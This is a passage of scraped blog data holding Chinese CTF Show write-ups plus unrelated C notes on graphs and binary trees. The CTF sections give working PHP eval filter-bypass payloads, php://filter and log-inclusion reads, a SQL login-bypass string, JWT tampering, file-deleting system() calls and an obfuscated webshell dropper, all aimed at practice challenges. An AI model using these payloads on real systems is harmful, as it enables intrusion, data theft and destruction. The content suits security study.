&#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 过滤了 分号 ; 1234# include + 伪协议?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=config.php# ?&gt; 闭合?c=passthru(&#x27;tac con\\fig*&#x27;)?&gt; Web 141234567891011121314&lt;?php# flag in config.phpinclude(&quot;config.php&quot;);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/system|exec|highlight|cat|\\(|\\.|\\;|file|php|config/i&quot;,$c))&#123; eval($c); &#125;else&#123; die(&quot;cmd error&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 1234# include + 伪协议?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=config.php?c=echo `$_GET[a]`?&gt;&amp;a=tac config.php Web 15 — 过滤 ?1234567891011121314&lt;?php# flag in config.phpinclude(&quot;config.php&quot;);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/system|\\\\*|\\?|\\&lt;|\\&gt;|\\=|exec|highlight|cat|\\(|\\.|file|php|config/i&quot;,$c))&#123; eval($c); &#125;else&#123; die(&quot;cmd error&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 过滤问号 ? 12?c=echo `$_GET[a]`;&amp;a=tac config.php?c=include$_GET[1];&amp;1=php://filter/read=convert.base64-encode/resource=config.php Web 161234567891011121314&lt;?php# flag in config.phpinclude(&quot;config.php&quot;);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(md5(&quot;ctfshow$c&quot;)===&quot;a6f57ae38a22448c2f07f3f95f49c84e&quot;)&#123; echo $flag; &#125;else&#123; echo &quot;nonono!&quot;; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 脚本： 123456789import hashlibstr1=&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;for i in str1: for j in str1: for k in str1: s = hashlib.md5((&#x27;ctfshow&#x27;+i+j+k).encode()).hexdigest() #print(type(s)) if s==&#x27;a6f57ae38a22448c2f07f3f95f49c84e&#x27;: print(i+j+k) 得到 36d 1?c=36d Web 17-21 — 日志包含12345678910&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/php/i&quot;,$c))&#123; include($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 日志包含 1?c=/var/log/nginx/access.log Web 1812345678910&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/php|file/i&quot;,$c))&#123; include($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 密码1密文： 53316C6B5A6A42684D3256695A44566A4E47526A4D5459774C5556375A6D49324D32566C4D4449354F4749345A6A526B4F48303D 十六进制到文本字符串 再 base64 解码 KYdf0a3ebd5c4dc160-E{fb63ee0298b8f4d8} 栅栏密码解码 密码2出题人已累，随便敲了几下键盘。。。 rdcvbg 2qase3 6tghu7 rdcvbg 2qase3 6tghu7 ​ f w y 三组，包围 KEY{fwy} 密码3题目名称：我想吃培根 题目描述： – — .-. … . ..–.- .. … ..–.- -.-. — — .-.. ..–.- -… ..- - ..–.- -… .- -.-. — -. ..–.- .. … ..–.- -.-. — — .-.. . .-. ..–.- – – -.. -.. – -.. – -.. – – – -.. -.. -.. /– -.. – -.. -.. –/ – – – – – /– -.. -.. – -.. – /– -.. -.. – 格式：flag{***********} 摩斯密码解密 得到 mmddmdmdmmmdddmdmddmmmmmmmddmdmmddm 将 m 替换成 A，d 替换成 B ，AABBABABAAABBBABABBAAAAAAABBABAABBA 培根密码解密 密码#4QW8obWdIWF5FKUFSQW5URihKXWZAJmx0OzYiLg== base64 得到 Ao(mgHX^E)ARAnTF(J]f@&lt;6”. 然后 base85 隐写1下载到本地，打不开 010 查看，文件头损坏 更改为 89 后保存，打开即可 隐写2下载工具，打开图片，点击 Seek ，密码为空，保存，得到所解出的密文 萌新 隐写2 — zip 伪加密 ziperello 暴力破解 zip 伪加密 ziperello 工具 伪加密是09，这里是01，是真有密码。 萌新 隐写3 萌新 隐写4 — .doc 打开之后，可以看见存在换行，在 word 选项中设置 显示隐藏文字 萌新 隐写51䴀娀圀䜀䌀娀娀䤀一䈀儀圀㘀堀㌀䬀一䘀㈀嘀㘀夀吀嘀䰀㔀㐀圀㘀㌀吀䠀䰀㔀刀䐀䜀䴀匀㜀䘀䔀㴀㴀㴀㴀㴀㴀\\\\=。=// MZWGCZZINBQW6X3KNF2V6YTVL54W63THL5RDGMS7FE====== base32 萌新6 — .flac 音频 — audacity 工具 左声道 样子像 摩斯电码 将右声道设置为静音，提高音量，导出为 Mp3 打开 摩斯电码音频解码工具 有误差 ，答案是 flag{MUZIKISG00D} 杂项1小明想给心爱的妹子表白很久，可是不知道怎么开口，你能帮帮小明吗？ 已知 md5(表白的话+ctf)=ed400fbcff269bd9c65292a97488168a 提交flag{表白的话} https://cmd5.la/user/index.php 杂项2 萌新 杂项3大家好我是小萌新羽，前不久我的一个朋友给我了一张银行卡，他说里面有一大笔钱，但是他只告诉我他的生日是九七年十月一日，你能帮我猜猜他的银行卡密码是多少吗，哦对，这个朋友有个小名叫小五。 flag格式：flag{银行卡密码} flag{971015} 杂项4小明心爱的图片在压缩包中，可是小明夜深人静的时候，孤枕难眠，想打开图片排遣寂寞，可是忘记了密码了，小米依稀记得9位的密码都是数字，前3位是372，你能帮助小明吗？ zip 压缩包 ziperello 直接爆破得到密码 ARCHPR 掩码 杂项5小明如愿以偿的打开了压缩包，可是眼前的文字自己只能认识FBI，其他的都不认识，而且屏幕出现了一句话，你能帮小明找到这句话的意思吗？ 杂项6小明的压缩包又忘记密码了？他去电脑维修店去修，人家扔出来说这个根本就没有密码，是个假密码。小明懵了，明明有密码的啊，你能帮帮小明吗？ 伪加密 ，将 09 替换成 00 杂项7小明小心翼翼的打开压缩包，竟然是个图片，什么鬼？ 要是图片能继续往长一点该多好啊，小明暗暗的想。 你能帮小明完成这个朴素的梦想吗？ 图片 SRC 计算图片正确的宽和高 脚本 12345678910111213141516import structimport binasciiimport os m = open(&quot;flag.png&quot;,&quot;rb&quot;).read()k=0for i in range(5000): if k==1: break for j in range(5000): c = m[12:16] + struct.pack(&#x27;&gt;i&#x27;, i) + struct.pack(&#x27;&gt;i&#x27;, j)+m[24:29] crc = binascii.crc32(c) &amp; 0xffffffff if crc == 0x889C2F07: k = 1 print(hex(i),hex(j)) break 杂项812345678910111213141516import structimport binasciiimport os m = open(&quot;flag.png&quot;,&quot;rb&quot;).read()k=0for i in range(5000): if k==1: break for j in range(5000): c = m[12:16] + struct.pack(&#x27;&gt;i&#x27;, i) + struct.pack(&#x27;&gt;i&#x27;, j)+m[24:29] crc = binascii.crc32(c) &amp; 0xffffffff if crc == 0x889C2F07: k = 1 print(hex(i),hex(j)) break 和杂项7一样，修改正确的宽高 杂项9 — 链接失效 — 过题目地址： 链接: https://pan.baidu.com/s/1XqF-OyHbH5WHFEUJvVZPEA 提取码: fcg3 要求：写一个本地外挂，小地图显示全图。 提示：游戏版本1.24E，修改game.dll 提交小地图全图基址即可。例如：flag{0xxxxxxx} 杂项10 摘掉眼镜，仔细看图片 flag{我好喜欢你} 杂项11密码为空，提取文件得到 1.jpg，一个二维码 使用 二维码扫描工具扫描，得到 base64 解码得到","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"CTF-Show-黑盒测试","slug":"CTF-Show-黑盒测试","date":"2021-11-19T07:14:09.000Z","updated":"2021-11-19T07:15:45.222Z","comments":true,"path":"2021/11/19/CTF-Show-黑盒测试/","link":"","permalink":"https://xizhi-future.github.io/2021/11/19/CTF-Show-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/","excerpt":"","text":"一、黑盒测试1.1 Web 380扫目录可以发现 尝试 ?id=2 可以看到是 file_get_contents 那 ?id=flag 尝试 ，查源码得到 1.2 Web 381 可以看到这里与之前不同，但是尝试访问过后，依旧不行 那继续扫，发现，仍然得到了 page.php 123?id=12 3 4# 发现对应的是每一篇报道 依次访问，最终无所获，且尝试过后 page_flag.php 应该也是不存在的 又回到最初发现的原密码目录，再次尝试，成功 1.3 Web 382-383这次再直接访问过后，就是登录页面 SQL 万能密码 1username: admin&#x27;or&#x27;1&#x27;=&#x27;1 密码爆破 1.4 Web 3841密码前2位是小写字母，后三位是数字 万能密码不可行，只能根据题目进行爆破 1234str = &#x27;abcdefghigklmnopqrstuvwxyz&#x27;for i in str: for j in str: print(i,j) 1.5 Web 385同样有后台登录，但是密码也没有提示，我们先不进行爆破 扫目录，有新的发现 证明我们已经重置了密码，那么 所谓的 默认密码是多少呢？ 不管是多少，肯定是弱密码，我们可以再进行爆破，也可以结合之前所爆破出来的密码尝试 1admin888 1.6 Web 386说是扫出来的 clear.php ，但是我 dirsearch 没有扫出来，说白了，还是字典不够强大 也就是说，我们需要首先清除掉 lock.dat 1/clear.php?file=./install/lock.dat 清理成功之后再次像上一关那样就好了 1.7 Web 3871前面部分和386一样 说是和上一关一样，但是这次删不了，我们继续扫目录 看来 robots.txt 也是用来提示我们 /debug/ 的 尝试传递参数试试 123?file=php://filter/resource=flag.php?file=/flag#等等都查不出来 那么，进行日志包含 1?file=/var/log/nginx/access.log 然后抓包修改，写入命令 只在当前页面发现了一个 index.php 12345678910111213141516171819/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2021-01-09 15:26:15# @Last Modified by: h1xa# @Last Modified time: 2021-01-09 15:30:48# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;file&#x27;]))&#123; $html = shell_exec(&#x27;php -f &#x27;.$_GET[&#x27;file&#x27;]); echo $html;&#125;else&#123; echo &#x27;file not exist&#x27;;&#125;&quot; 1234567891011121314151617181920212223242526272829303132&lt;?php system(&#x27;ls /var/www/html/&#x27;);alsckdfyclear.phpdebugindex.phpinstalllayuipage.phppage_1.phppage_2.phppage_3.phppage_4.phprobots.txt&lt;?php system(&#x27;ls /&#x27;); ?&gt;bindevetchomelibmediamntoptprocrootrunsbinsrvsystmpusrvar 看样子没有 flag 那么根据之前的思路，我们只要把 lock.dat 删掉，那么就可以重置管理员密码，就能够成功登录 123&lt;?php system(&#x27;rm ../install/lock.dat&#x27;); ?&gt;然后我们可以再进行验证一下&lt;?php system(&#x27;ls ../install/&#x27;); ?&gt; 此时再访问 install ，已经变成 然后进入后台登陆即可 admin888 最后才想到，flag 应该是出现在 登陆成功之后的页面里的，也就是 /alsckdfy/check.php ，所以我们也完全可以 1&lt;?php system(&#x27;cat ../alsckdfy/check.php&#x27;); ?&gt; 即可查到 1.8 Web 388按照之前的思路来 看了其它大神的解，发现在后台还有 /editor/ 目录，一扫，果然 那么就一定存在文件上传的问题 alsckdfy/editor 文件上传 /debug?file= 进行文件包含，写入 .php 文件 访问 .php 文件，进行命令执行 我想着写完之后提交，居然还未开放，那就只好 上传文件了 KindEditor 4.1.11 (2016-03-31) 网上查找相关漏洞 123# 我尝试了一下/alsckdfy/editor/php/file_manager_json.php?path=/# 居然不行 那就别想着 编辑器的 任意文件遍历的 漏洞了，老老实实上传文件吧 1234567# 本地的 2.zip 免杀🐎&lt;?php$s=&#x27;&lt;?ph&#x27;.&#x27;p ev&#x27;.&#x27;al($_PO&#x27;.&#x27;ST[1])&#x27;.&#x27;;?&gt;&#x27;;file_put_contents(&#x27;/var/www/html/2.php&#x27;,$s);# 路径 # /alsckdfy/attached/file/20210804/20210804083008_10879.zip 可以看到有限制，我们可以上传 .zip 文件 然后包含，我们将它写到 网站根目录下 1/debug/?file=/var/www/html/alsckdfy/attached/file/20210804/20210804083008_10879.zip 可以看到，上传成功 直接命令执行，查看源码得到 1.9 Web 389按照上面思路 权限不足，找 cookie 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYyODA2Njc0NiwiZXhwIjoxNjI4MDczOTQ2LCJuYmYiOjE2MjgwNjY3NDYsInN1YiI6InVzZXIiLCJqdGkiOiIwMDRmYzQzMjU0ODI3MGVlYTc4Mjg3MTg5ZWE2YjNkOCJ9.PWduIXmiYUefpQpuTkyCxMmg7IWvRvWqyC1rJZA8aIs jwt 在线 解密 https://jwt.io/ 然后我们修改为 admin 更改之后刷新，回到上一关 /alsckdfy/attached/file/20210804/20210804085256_19145.zip","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"图","slug":"图","date":"2021-11-14T09:36:24.000Z","updated":"2021-11-14T09:37:30.447Z","comments":true,"path":"2021/11/14/图/","link":"","permalink":"https://xizhi-future.github.io/2021/11/14/%E5%9B%BE/","excerpt":"","text":"一、图的基本存储结构需要存储的内容：存储 顶点信息、顶点之间的关系 三种常用的 图的 存储结构： 邻接矩阵 邻接表 临界多重链表 1.1 邻接矩阵存储结构： 一维数组（顺序表）—— 存储 数据元素的信息 二维数组（邻接矩阵）—— 存储 数据元素之间的 关系 特点： 无向图的邻接矩阵 一定是对称的，可使用 上三角或者是 下三角进行压缩存储，其存储空间只需要 n(n+1)/2 有向图的邻接矩阵 不一定是 对称的，其存储空间为 n 的平方 1234567891011#include&lt;stdio.h&gt;#define FINITY 5000 //此处使用 5000 表示无穷大#define M 20 //最大顶点数typedef char vertextype;//顶点值类型typedef int edgetype; //权值类型typedef struct&#123; //邻接矩阵 类型 vertextype vexs[M]; //顶点信息域（一维数组） edgetype edges[M][M]; //邻接矩阵（二维数组） int n,e; //图中顶点总数 与 边数&#125;Mgraph; 建立网络的 邻接矩阵算法： 1234567891011121314151617181920212223void creat(Mgraph *g,char *s,int c)&#123; //c=1表示建立有向图，c=0 表示建立无向图 int i,j,k,w; FILE *rf; rf = fopen(s,&quot;r&quot;); if(rf)&#123; fscanf(rf,&quot;%d%d&quot;,&amp;g-&gt;n,&amp;g-&gt;e); for(i=0;i&lt;g-&gt;n;i++) fscanf(rf,&quot;%ls&quot;,&amp;g-&gt;vexs[i]); for(i=0; i&lt;g-&gt;n;i++) for(j=0;j&lt;g-&gt;n;j++) if(i == j) g-&gt;edges[i][j] = FINITY; for(k=0;k&lt;g-&gt;e;k++)&#123; fscanf(rf,&quot;%d%d%d&quot;,&amp;i,&amp;j,&amp;w); g-&gt;edges[i][j] = w; if(c == 0) g-&gt;edges[j][i] = w; &#125; fclose(rf); &#125; else g-&gt;n = 0;&#125; 缺点：邻接矩阵法，占用的存单元只与图中顶点的个数有关，与边数无关，如果一个图中的边数比结点个数少得多，则该邻接矩阵中就会出现很对的空元素，从而浪费空间。 1.2 邻接表存储结构： 头结点：两个域—–数据域 vertex ，头指针域 firstedge 表结点：两个域—–邻接点域 adjvex ，链域 next 如果是网络，带权值，则可在头结点中添加一个数据域来存储权值 出边表（有向图的邻接表）、入边表（逆邻接表） 如果图中含有 n 个顶点，e 条边，则它的邻接表存储结构需要 n个头结点和 2e 个边结点 123456789101112131415161718#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#define M 20 //预定义图的最大顶点数typedef char DataType; //顶点信息数据类型typedef struct node&#123; //边表结点 int adjvex; //邻接点 struct node *next; //指向下一个邻接点&#125;EdgeNode;typedef struct vnode&#123; //头结点类型 DataType vertex; //顶点信息 EdgeNode *FirstEdge;//邻接链表头指针&#125;VertexNode; typedef struct&#123; //邻接表 类型 VertexNode adjlist[M];//存放头结点的顺序表 int n,e; //图的顶点数、边数&#125;LinkedGraph; 无向图邻接表建立算法： 123456789101112131415161718192021222324252627282930//邻接表 创建图void create(LinkedGraph *g,char *filename,int c)&#123; //c=0 表示建立无向图 int i,j,k; EdgeNode *s; FILE *fp; fp = fopen(filename,&quot;r&quot;); if(fp)&#123; fscanf(fp,&quot;%d%d&quot;,&amp;g-&gt;n,&amp;g-&gt;e); //读入顶点数与边数 for(i=0 ;i&lt;g-&gt;n;i++)&#123; fscanf(fp,&quot;%ls&quot;,&amp;g-&gt;adjlist[i].vertex); //读入顶点信息 g-&gt;adjlist[i].FirstEdge = NULL; //边表置为空表 &#125; for(k=0; k &lt; g-&gt;n; k++)&#123; fscanf(fp,&quot;%d%d&quot;,&amp;i,&amp;j); //输入无序对 s = (EdgeNode *)malloc(sizeof(EdgeNode)); s-&gt;adjvex = j; s-&gt;next = g-&gt;adjlist[i].FirstEdge; g-&gt;adjlist[i].FirstEdge = s; //相当于 前插 if(c == 0)&#123; //无向图 s = (EdgeNode *)malloc(sizeof(EdgeNode)); s-&gt;adjvex = i; s-&gt;next = g-&gt;adjlist[j].FirstEdge; g-&gt;adjlist[j].FirstEdge = s; &#125; &#125; fclose(fp); &#125; else //文件打开失败 g-&gt;n = 0; &#125; 注意：文件输入 数据内容时，第一行的结点个数不变，为 n，但是边数得是 2e 1.3 邻接多重表边表结点：五个域 mark 标志域（是否被访问过） vexi vexj 该边两个顶点在图中的位序 linki linkj 两个边结点的指针 linki 指向关联与 vexi 结点的下一条边 linkj 指向关联与 vexj 结点的下一条边 表头结点：两个域 vertex 顶点信息 firstedge 关联与 顶点 的 第一条边 二、图的遍历2.1 深度优先遍历访问顺序域图的邻接表的存储状态有关，由于图的邻接表存储不是唯一的，则对于同一个图，其深度优先遍历的输出结果也是不同的。 1234567891011121314151617181920212223int visited[M]; //作为访问的标记//深度优先遍历 算法void dfs(LinkedGraph g,int i)&#123; EdgeNode *p; printf(&quot;visit vertex: %c\\n&quot;,g.adjlist[i].vertex); //访问顶点 i visited[i] = 1; //表示已经访问过 p = g.adjlist[i].FirstEdge; //从 p 的邻接点开始进行 深度优先遍历 while(p)&#123; if(!visited[p-&gt;adjvex]) dfs(g,p-&gt;adjvex); p = p-&gt;next; &#125;&#125;void DfsTraverse(LinkedGraph g)&#123; int i; for(i = 0;i &lt;g.n; i++) visited[i] = 0; //初始化都为 0 ，代表都未被访问过 for(i=0; i&lt;g.n; i++) if(!visited[i]) //如果 i 未被访问过 dfs(g,i);&#125; 2.2 广度优先遍历特点：尽可能地首先对 横向结点进行访问 使用队列，使用邻接表存储结构 1234567891011121314151617181920212223242526272829303132333435363738int visited[M]; //全局标志：是否访问过//广度优先遍历 算法void bfs(LinkedGraph g,int i)&#123; int j; EdgeNode *p; int queue[M],front,rear; //FIFO 队列 front = rear = 0; //初始化空队列 printf(&quot;%c&quot;,g.adjlist[i].vertex); visited[i] = 1; queue[rear++] = i; //被访问结点进入队列 while(rear &gt; front)&#123; j = queue[front++]; // 出队 p = g.adjlist[j].FirstEdge; while(p)&#123; if(visited[p-&gt;adjvex] == 0)&#123; printf(&quot;%c&quot;,g.adjlist[p-&gt;adjvex].vertex); queue[rear++] = p-&gt;adjvex; visited[p-&gt;adjvex] = 1; &#125; p = p-&gt;next; &#125; &#125; printf(&quot;\\n&quot;);&#125;//返回连通分量的个数int BfsTraverse(LinkedGraph g)&#123; int i,count = 0; for(i=0;i&lt;g.n;i++) visited[i] = 0; //初始化标志数组，都未被访问过 for(i=0 ;i&lt;g.n ;i++) if(!visited[i])&#123; //vi未被访问过 //printf(&quot;\\n&quot;); count++; //计数器：连通分量 个数加1 bfs(g,i); &#125; return count;&#125; 12345678int main()&#123; LinkedGraph g; int count; create(&amp;g,&quot;g7.txt&quot;,0); // 0 代表无向图 count = BfsTraverse(g); printf(&quot;\\n 该图共有 %d 个连通分量。\\n&quot;,count); return 0;&#125;","categories":[{"name":"数据结构","slug":"数据结构","permalink":"https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[],"author":"xizhi-future"},{"title":"二叉树","slug":"二叉树","date":"2021-11-13T01:02:23.000Z","updated":"2021-11-14T09:28:48.479Z","comments":true,"path":"2021/11/13/二叉树/","link":"","permalink":"https://xizhi-future.github.io/2021/11/13/%E4%BA%8C%E5%8F%89%E6%A0%91/","excerpt":"","text":"二叉树1.1 概念由结点构成的有限集合，集合可为空，或者是由一个根结点以及两颗互不相交的分别称作 该根结点的左子树域右子树的二叉树组成。 空二叉树 二叉树五种基本形态 二叉树与一般的树型结构的区别在于： 二叉树中每个非空结点最多只有两个子女，而一般的树型结构中每个非空结点可以有0到多个子女; 二叉树中结点的子树要区分左子树和右子树，即使在结点只有一棵子树的情况下也要明确指出是左子树还是右子树。 1.2 二叉树 性质 性质1：一棵非空二叉树的 第i层 上至多有 2 的 i-1 次方 个 结点 (i≥1)。 性质2：深度为h的二叉树至多有 2 的 h 次方 -1 个结点(h&gt;1) 。 性质3： 对于任何一棵二叉树T，如果其终端结点数为no，度为2的结点数为n2，则 no=n2+1。 性质4：具有 n 个结点的完全二叉树的深度 是 [log以2为底n的对数] + 1 其它性质： 完全二叉树、满二叉树： 完全二叉树的性质： 1.3 二叉树的 存储结构1.3.1 完全二叉树 的 顺序存储按照 二叉树 从上到下、同一层次 从左到右的顺序，依次将结点存储在 一个 一维数组 中。 利用完全二叉树的性质 1234#define MAXSIZE 20typedef char datatype; //二叉树结点类型datatype tree[MAXSIZE];int n; //树 实际所含结点个数 1.3.2 一般二叉树 的 顺序存储每个结点：三个域 值域：data 不带双亲： 12345678910#define MAXSIZE 20typedef char datatype;typedef struct&#123; //结点值类型 datatype data; int lchild,rchild; //存放 左、右 子女下标&#125;node;node tree[MAXSIZE]; int n; //树中实际所含结点个数int root; //存放根结点的下标 带双亲： 1234567891011#define MAXSIZE 20typedef char datatype;typedef struct&#123; datatype data; int lchild,rchild; int parent; //存放双亲结点下标&#125;node;node tree[MAXSIZE];int n;int root; 1.3.2 链式存储每个结点：三个域 值域：data 指针域：分别指向左右子树 不带双亲： 12345678typedef char datatype;typedef struct node&#123; //二叉树结点类型 datatype data; struct node *lchild,*rchild; //指向左右子树的指针&#125;bintnode;typedef bintnode *bintree;bintree root; 带双亲： 123456789typedef char datatype;typedef struct node&#123; //二叉树结点类型 datatype data; struct node *lchild,*rchild; struct node *parent; //指向双亲的指针&#125;bintnode;typedef bintnode *bintree;bintree root; //指向二叉树根结点的指针 1.4 二叉树的遍历 —– 递归实现按照一定的顺序对二叉树这每个结点进行访问，且只能访问一次。 1.4.1 前序遍历 —- 根-&gt;左-&gt;右1234567void preorder(bintree t)&#123; if(t)&#123; printf(&quot;%c&quot;,t-&gt;data); preorder(t-&gt;lchild); preorder(t-&gt;rchild); &#125;&#125; 1.4.2 中序遍历 —- 左-&gt;根-&gt;右1234567void inorder(bintree t)&#123; if(t)&#123; inorder(t-&gt;lchild); printf(&quot;%c&quot;,t-&gt;data); inorder(t-&gt;rchild); &#125;&#125; 1.4.3 后序遍历 —- 左-&gt;右-&gt;根1234567void postorder(bintree t)&#123; if(t)&#123; postorder(t-&gt;lchild); postorder(t-&gt;rchild); printf(&quot;%c&quot;,t-&gt;data); &#125;&#125; 1.5 二叉树的创建123456789101112131415//按照前序遍历的结果创建一颗 给定 二叉树bintree createbintree()&#123; char ch; bintree t; if((ch = getchar()) == &#x27;#&#x27;) //空子树 t = NULL; else &#123; t = (bintree *)malloc(sizeof(bintnode)); t-&gt;data = ch; t-&gt;lchild = createbintree(); t-&gt;rchild = createbintree(); &#125; return t;&#125;//注：输入时，必须按照 前序遍历 的顺序进行输入 1.6 二叉树的遍历 —– 非递归实现二叉树的 递归遍历 算法较简易，但是运行时间长，执行效率较低，下面是非递归算法实现二叉树的遍历。 使用一个 栈 来进行回溯 123456789101112131415161718192021//顺序栈的定义typedef struct stack&#123; bintree data[100]; int tag[100]; //为栈中每个元素设置的标记，便于 后序遍历 int top; //栈顶指针&#125;seqstack;//进栈void push(seqstack *s,bintree)&#123; s-&gt;data[s-&gt;top] = t; s-&gt;top++;&#125;//出栈bintree pop(seqstack *s)&#123; if(s-&gt;top != 0)&#123; //判空 s-&gt;top--; return(s-&gt;data[s-&gt;top]); &#125; return NULL;&#125; 1.6.1 前序遍历 —- 根-&gt;左-&gt;右 当访问完 根结点之后，紧接着该访问其左子树，但前提是必须先使 当前结点放于 栈中保存起来，便于之后 右子树的访问。 当栈中的元素位于栈顶即将出栈时，则意味着根结点和左子树已经访问完成，出栈之后即可进行右子树的访问。 1234567891011121314void preorder(bintree t)&#123; seqstack s; s.top = 0; while((t) || (s.top!=0))&#123; //当前处理的子树不为空栈 或 栈不为空 时 if(t)&#123; printf(&quot;%c&quot;,t-&gt;data); push(&amp;s,t); t = t-&gt;lchild; &#125;else&#123; t = pop(&amp;s); t = t-&gt;rchild; &#125; &#125;&#125; 1.6.2 中序遍历 —- 左-&gt;根-&gt;右 首先访问 左子树，但由于此时 根结点和 右子树都未进行访问，则 需要将其 先放入栈中保存起来，以便之后对根结点和右子树的访问。 当栈中元素位于栈顶即将出栈时，即意味着其左子树已经访问完成，出栈后 则可 进行根结点和右子树的访问。 1234567891011121314void inorder(bintree t)&#123; seqstack s; s.top = 0; while((t!=NULL) || (s.top!=0))&#123; if(t)&#123; push(&amp;s,t); t = t-&gt;lchild; &#125;else&#123; t = pop(&amp;s); printf(&quot;%c&quot;,t-&gt;data); t = t-&gt;rchild; &#125; &#125;&#125; 1.6.3 后序遍历 —- 左-&gt;右-&gt;根 首先进行左子树的访问，同样需要将其先保存在栈中，便于之后对其 右子树以及根节点的访问。 需要使用 seqstack类型 中的 数组 tag ，其每个元素的值为0 或 1，用于标识栈中每个元素的状态。 当一个元素刚刚进栈时，当它第一次位于栈顶即将被处理时，其 tag 值为 0，意味着它的 右子树还没有进行访问，则接下来就应该访问它的 右子树，该元素仍旧在栈中，然后将其 tag 值改为 1，意味着此时其 右子树已经访问完成，当其第二次出现在栈顶即将被处理时，则意味着接下来应该访问它本身，即根结点，并将其出栈。 123456789101112131415161718192021void postorder(bintree t)&#123; seqstack s; s.top = 0; while((t) || (s.top!=0))&#123; if(t)&#123; s.data[s.top] = t; s.tag[s.top] = 0; s.top++; t = t-&gt;lchild; &#125;else if(s.tag[s.top-1] == 1)&#123; s.top--; t = s.data[s.top]; printf(&quot;%c&quot;,t-&gt;data); t = NULL; &#125;else&#123; t = s.data[s.top-1]; s.tag[s.top-1] = 1; t = t-&gt;rchild; &#125; &#125;&#125;","categories":[{"name":"数据结构","slug":"数据结构","permalink":"https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[],"author":"xizhi-future"},{"title":"数据结构第二次实验-二叉树的遍历（递归、非递归）","slug":"数据结构第二次实验-二叉树的遍历（递归、非递归）","date":"2021-11-13T00:59:50.000Z","updated":"2021-11-13T08:16:40.431Z","comments":true,"path":"2021/11/13/数据结构第二次实验-二叉树的遍历（递归、非递归）/","link":"","permalink":"https://xizhi-future.github.io/2021/11/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86%EF%BC%88%E9%80%92%E5%BD%92%E3%80%81%E9%9D%9E%E9%80%92%E5%BD%92%EF%BC%89/","excerpt":"","text":"头文件 bintree.h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;//二叉树的存储：链式存储（不带双亲）typedef char datatype; //定义结点类型typedef struct node&#123; //二叉树结点类型 datatype data; struct node *lchild,*rchild; //指向左右子树的指针&#125;bintnode;typedef bintnode *bintree;bintree root; //根结点//二叉树的创建：按照前序遍历的结果创建一颗 给定 二叉树bintree createbintree()&#123; char ch; bintree t; if((ch = getchar()) == &#x27;#&#x27;) //空子树 t = NULL; else &#123; t = (bintnode *)malloc(sizeof(bintnode)); t-&gt;data = ch; t-&gt;lchild = createbintree(); t-&gt;rchild = createbintree(); &#125; return t;&#125;//注：输入时，必须按照 前序遍历 的顺序进行输入//遍历算法------递归算法-----------------------------------//前序遍历（根 左 右）void preorder(bintree t)&#123; if(t)&#123; printf(&quot;%c&quot;,t-&gt;data); preorder(t-&gt;lchild); preorder(t-&gt;rchild); &#125;&#125;//中序遍历（左 根 右）void inorder(bintree t)&#123; if(t)&#123; inorder(t-&gt;lchild); printf(&quot;%c&quot;,t-&gt;data); inorder(t-&gt;rchild); &#125;&#125;//后序遍历（左 右 根）void postorder(bintree t)&#123; if(t)&#123; postorder(t-&gt;lchild); postorder(t-&gt;rchild); printf(&quot;%c&quot;,t-&gt;data); &#125;&#125;//-------------------------------------------------------------//顺序栈的定义typedef struct stack&#123; bintree data[100]; int tag[100]; //为栈中每个元素设置的标记，便于 后序遍历 int top; //栈顶指针&#125;seqstack;//进栈void push(seqstack *s,bintree t)&#123; s-&gt;data[s-&gt;top] = t; s-&gt;top++;&#125;//出栈bintree pop(seqstack *s)&#123; if(s-&gt;top != 0)&#123; //判空 s-&gt;top--; return(s-&gt;data[s-&gt;top]); &#125; return NULL;&#125;//遍历算法------非递归算法-----------------------------------//前序遍历（根 左 右）void preorder_1(bintree t)&#123; seqstack s; s.top = 0; while((t) || (s.top!=0))&#123; //当前处理的子树不为空栈 或 栈不为空 时 if(t)&#123; printf(&quot;%c&quot;,t-&gt;data); 